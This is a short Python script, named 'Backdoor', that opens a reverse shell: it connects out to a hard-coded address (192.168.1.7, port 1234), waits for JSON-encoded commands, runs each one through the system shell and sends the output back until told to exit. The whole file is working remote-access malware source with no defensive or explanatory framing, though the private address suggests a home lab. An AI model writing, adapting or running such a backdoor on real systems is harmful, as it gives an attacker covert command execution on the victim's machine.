#!/usr/bin/python3
import socket 
import json
import subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_commands(self,command):
        return subprocess.check_output(command,shell=True)

    def Run(self):
        while(True):
            command = self.reliable_recieve()
            if command[0] == "exit":
                self.connection.close()
                exit()
            command_result = self.execute_commands(command)
            self.reliable_send(command_result)
        



my_backdoor = Backdoor("192.168.1.7",1234)
my_backdoor.Run()
